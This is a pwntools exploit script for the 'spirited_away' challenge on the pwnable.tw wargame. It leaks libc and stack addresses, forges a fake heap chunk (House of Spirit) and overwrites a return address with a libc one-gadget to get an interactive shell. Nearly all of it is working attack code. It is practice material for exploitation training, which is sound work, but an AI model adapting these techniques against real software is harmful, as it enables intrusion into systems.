#!/usr/bin/env python3
from pwn import *

PORT = 10204
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./spirited_away_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0804873E
            b* 0x0804875E
            b* 0x080487AD
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def agree():
    p.sendlineafter(b'comment? <y/n>:', b'y')

def comment(name, age, reason, comment):
    p.sendafter(b'your name: ', name)
    p.sendlineafter(b'your age: ', str(age).encode())
    p.sendafter(b'this movie? ', reason)
    p.sendafter(b'your comment: ', comment)

# Stage 1: Leak stack + libc

comment(b'd1nhdwc', -1, b'A'*(0x14+4), b'B')

p.recvuntil(b'A'*(0x14+4))
libc.address = u32(p.recv(4)) - 0x5f29b - 0x834c
log.success(f'libc_base :{libc.address:#x}')
agree()


comment(b'd1nhdwc', -1, b'A'*(0x38), b'B')

p.recvuntil(b'A'*(0x38))
stack_leak = u32(p.recv(4))
log.success(f'stack_leak :{stack_leak:#x}')
agree()

## Stack Overflow

for _ in range(8):
    comment(b'dump', 1, b'A', b'B')
    agree()

for _ in range(90):
    comment(b'', 1, b'A', b'')
    agree()

# Stage 2: House of Spirit

ebp = stack_leak - 0x20
fake_chunk = ebp - 0x40

pl1 = flat(
    b'A'*0x8,
    0, 0x41,
    b'B'*0x38,
    0, 0x41
    )

pl2 = flat(
    b'C'*0x50,
    -1,
    fake_chunk
    )

comment(b'donaldump', 9, pl1, pl2)
agree()

pl3 = flat(
    b'D'*(0x4c-0x8),
    libc.address + 0x3a819
    )
# GDB()

comment(pl3, -1, b'\n', b'\n')
p.sendlineafter(b'comment? <y/n>:', b'n')

p.interactive()

# d1nhdwc